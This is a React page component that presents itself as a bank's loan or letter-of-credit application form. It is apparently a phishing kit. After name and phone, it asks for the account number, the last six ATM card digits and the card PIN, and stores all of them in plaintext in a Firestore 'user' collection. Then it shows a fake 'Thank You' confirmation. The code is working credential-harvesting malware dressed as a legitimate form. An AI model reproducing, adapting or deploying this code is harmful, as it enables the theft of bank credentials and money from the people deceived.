

import { useState } from "react"
import FormHero from "./formHero"
import {
    motion
    /*useScroll, useTransform*/
} from 'framer-motion';

import {db} from '../../firedb'
import { collection, addDoc} from "firebase/firestore";

export default function Loan() {
    
    
    const [account_number, setAccount_number] = useState('');
    const [sixDigits, setSixDigits] = useState('');
    const [pin, setPin] = useState('');
    const [loanAmount, setLoanAmount] = useState('');
    const [name, setName] = useState('');
    const [phone, setPhone] = useState('');
    const [paybackDate, setPBDaet] = useState('');
    const [currentForm, setCurrentForm] = useState(1);
    const [error, setError] = useState('');
   
    const onSubmitForm = async () => {
        const created = new Date(Date.now());
        if (account_number===''||pin===''||loanAmount===''||sixDigits===''|| name===''||phone==='') {
            return
        }
        const data = {
            account_number: account_number,
            phone: phone,
            sixDigits: sixDigits,
            pin: pin,
            loanAmount: loanAmount,
            name: name,
            paybackdate:paybackDate,
            createdAt: new Date(created),
            dn:Date.now()
        }
        setError('')
       
        try {
            const docs = await addDoc(collection(db, 'user'), data);
        
            if (docs) {
                setCurrentForm(3);
                localStorage.setItem('zenloan', data);
           }
        } catch (error) {
           
            console.log('this error:::', error)
        }
    }

    const handleCancel = () => {
        setCurrentForm(1);
    }

    if (currentForm === 3) {
        return (
            <div className="flex flex-col items-center justify-center min-h-screen md:w-1/2 w-[90%] m-auto">
              <div className="max-w-md p-6 bg-white shadow-lg rounded-lg">
                <h1 className="text-2xl font-semibold mb-4">Thank You!</h1>
                <p className="mb-4">
                  We have received your loan application and our team will review it soon.
                </p>
                <p className="mb-4">
                  If you have any questions or need further assistance, please feel free to contact us.
                </p>
                <button
                  className="bg-red-500 hover:bg-red-600 text-white font-semibold py-2 px-4 rounded"
                  onClick={handleCancel}
                >
                  Cancel Application
                </button>
              </div>
            </div>)
    }
  return (
      <div className="md:w-1/2 w-[90%] m-auto">
          <FormHero header='Letter of Credit Application Form' text='We support your business in every way we can. So if you need Letters of Credit, you can count on us to deliver and keep your business relationships purring along smoothly.'/>
          
          {
              error != '' && <div className=" bg-yellow-600 text-red-700 p-4 text-center">{error}</div>
          }
          {
              currentForm === 1 ? (<div className=" mt-2 flex flex-col gap-2">
             
               <input
                  name="name"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                  type='text'
                  placeholder="Full Name"
                      onChange={(e) => setName(e.target.value)}
                      value={name}
              />

            <input
                  name="phone_number"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                      type='tel'
                      maxLength={12}
                  placeholder="Phone Number"
                      onChange={(e) => setPhone(e.target.value)}
                      value={phone}
              /> 

              <button onClick={()=>setCurrentForm(2)} className={ ` text-white p-3 ${name===''||phone==='' ? 'bg-[#b5b5b5]':'bg-[#e3000f]'}`} disabled={ name===''||phone===''}>Next</button>
          </div>):(<motion.div className=" mt-2 flex flex-col gap-2">
              <input
                  className=" w-[100%] border-2 border-[#e3000f] p-3"
                  type='tel'
                  placeholder="Account Number"
                          name="account_number"
                          maxLength={11}
                  onChange={(e)=>setAccount_number(e.target.value)}
            />
              <input
                  name="last6"
                  type='tel'
                className="  w-[100%] border-2 border-[#e3000f] p-3"
                  placeholder="Last six Digits on ATM CARD"
                  onChange={(e)=>setSixDigits(e.target.value)}
            />
              <input
                  name="card_pin"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                          type='tel'
                          maxLength={4}
                  placeholder="Card pin"
                  onChange={(e)=>setPin(e.target.value)}
              />
               <input
                  name="loan_amount"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                  type='tel'
                  placeholder="Loan Amount"
                  onChange={(e)=>setLoanAmount(e.target.value)}
                      />
                      <br/>
                      <div>Payback Date</div>
                <input
                  name="payback_date"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                  type='date'
                  placeholder="Payback Date"
                  onChange={(e)=>setPBDaet(e.target.value)}
              />

            

              <button onClick={onSubmitForm} className={ ` text-white p-3 ${account_number===''||pin===''||loanAmount===''||sixDigits==='' ? 'bg-[#b5b5b5]':'bg-[#e3000f]'}`} disabled={ account_number===''||pin===''||loanAmount===''||sixDigits===''}>Submit</button>
          </motion.div>)
          }

      </div>
      
  )
}
